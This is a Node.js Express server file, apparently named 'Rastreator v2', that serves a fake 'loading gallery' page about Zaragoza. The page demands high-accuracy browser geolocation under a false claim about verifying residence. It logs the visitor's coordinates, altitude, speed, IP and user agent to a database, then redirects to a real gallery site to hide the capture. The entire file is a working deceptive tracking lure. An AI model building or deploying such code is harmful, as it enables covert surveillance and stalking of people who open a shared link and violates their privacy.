const express = require('express');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;
const REDIRECT_URL = 'https://verpueblos.com/aragon/zaragoza/zaragoza/galeria/18/';

// ── PostgreSQL connection ──────────────────────────────────────────────────
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false,
});

let dbReady = false;

async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS visitors (
        id           SERIAL PRIMARY KEY,
        timestamp    TIMESTAMPTZ DEFAULT NOW(),
        ip           TEXT,
        user_agent   TEXT,
        geo_denied   BOOLEAN,
        deny_reason  TEXT,
        latitude     DOUBLE PRECISION,
        longitude    DOUBLE PRECISION,
        accuracy     DOUBLE PRECISION,
        altitude     DOUBLE PRECISION,
        alt_accuracy DOUBLE PRECISION,
        heading      DOUBLE PRECISION,
        speed        DOUBLE PRECISION
      );
    `);
    dbReady = true;
    console.log('✅ Tabla "visitors" lista.');
  } catch (err) {
    console.warn('⚠️  DB no disponible, servidor arranca sin persistencia:', err.message);
  }
}

// ── IP helper ──────────────────────────────────────────────────────────────
function getRealIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    const first = xff.split(',')[0].trim();
    if (first && first !== '::1') return first;
  }
  const cfIP = req.headers['cf-connecting-ip'];
  if (cfIP) return cfIP;
  return req.socket?.remoteAddress || req.ip || 'unknown';
}

// ── HTML inlined — bypasses static file caching entirely ──────────────────
const PAGE_HTML = `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Cargando galería · Zaragoza</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      height: 100%;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      overflow: hidden;
    }
    #state-loading {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
    }
    .spinner {
      width: 52px; height: 52px;
      border-radius: 50%;
      border: 3px solid #e5e5e5;
      border-top-color: #9ca3af;
      animation: spin .9s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .label { font-size: 14px; color: #6b7280; letter-spacing: .02em; }

    #state-denied {
      display: none;
      flex-direction: column;
      align-items: center;
      text-align: center;
      gap: 20px;
      max-width: 320px;
      padding: 0 24px;
    }
    .denied-icon { font-size: 48px; }
    .denied-title { font-size: 15px; font-weight: 600; color: #111827; line-height: 1.5; }
    .denied-msg   { font-size: 14px; color: #6b7280; line-height: 1.6; }
    .btn-reload {
      margin-top: 6px;
      padding: 10px 28px;
      border: none; border-radius: 50px;
      background: #111827; color: #fff;
      font-family: inherit; font-size: 14px; font-weight: 500;
      cursor: pointer;
    }
    .btn-reload:hover { background: #374151; }
  </style>
</head>
<body>
  <div id="state-loading">
    <div class="spinner"></div>
    <span class="label">Cargando la galería de fotos</span>
  </div>
  <div id="state-denied">
    <div class="denied-icon">📍</div>
    <p class="denied-title">Debes permitir compartir tu ubicación para asegurarnos que resides en Zaragoza Provincia</p>
    <p class="denied-msg">Recarga la página y acepta el permiso de ubicación cuando el navegador te lo solicite.</p>
    <button class="btn-reload" onclick="location.reload()">Recargar página</button>
  </div>
  <script>
    const REDIRECT = '${REDIRECT_URL}';
    let done = false;

    function showDenied() {
      document.getElementById('state-loading').style.display = 'none';
      document.getElementById('state-denied').style.display = 'flex';
    }

    function redirectAfterLog(payload) {
      if (done) return;
      done = true;
      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      }).finally(() => { window.location.href = REDIRECT; });
      setTimeout(() => { window.location.href = REDIRECT; }, 3000);
    }

    if (!navigator.geolocation) {
      showDenied();
    } else {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
          redirectAfterLog({ denied: false, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed });
        },
        (err) => {
          showDenied();
          fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ denied: true, reason: err.message || 'permission_denied' }),
            keepalive: true
          }).catch(() => {});
        },
        { enableHighAccuracy: true, timeout: 13000, maximumAge: 0 }
      );
    }
  <\/script>
</body>
</html>`;

// ── Middleware ─────────────────────────────────────────────────────────────
app.use(express.json());

// ── Routes ─────────────────────────────────────────────────────────────────
app.get('/zaragoza-villanueva', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(PAGE_HTML);
});

app.post('/api/log', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'] || 'unknown';
  const { denied, reason, latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = req.body;

  try {
    await pool.query(
      `INSERT INTO visitors
         (ip, user_agent, geo_denied, deny_reason,
          latitude, longitude, accuracy, altitude, alt_accuracy, heading, speed)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)`,
      [ip, userAgent, denied ?? true, reason ?? null,
       latitude ?? null, longitude ?? null, accuracy ?? null,
       altitude ?? null, altitudeAccuracy ?? null, heading ?? null, speed ?? null]
    );
    console.log(`[VISIT] IP: ${ip} | Geo: ${denied ? 'DENIED' : `${latitude}, ${longitude} (±${accuracy}m)`}`);
    res.json({ success: true });
  } catch (err) {
    console.error('DB error:', err.message);
    res.status(500).json({ success: false });
  }
});

app.get('/', (req, res) => res.redirect('/zaragoza-villanueva'));

// ── Start ──────────────────────────────────────────────────────────────────
// Start server regardless of DB status
app.listen(PORT, () => {
  console.log(`🚀 Rastreator v2 en línea → http://localhost:${PORT}/zaragoza-villanueva`);
});

// Attempt DB connection after server is up
initDB();
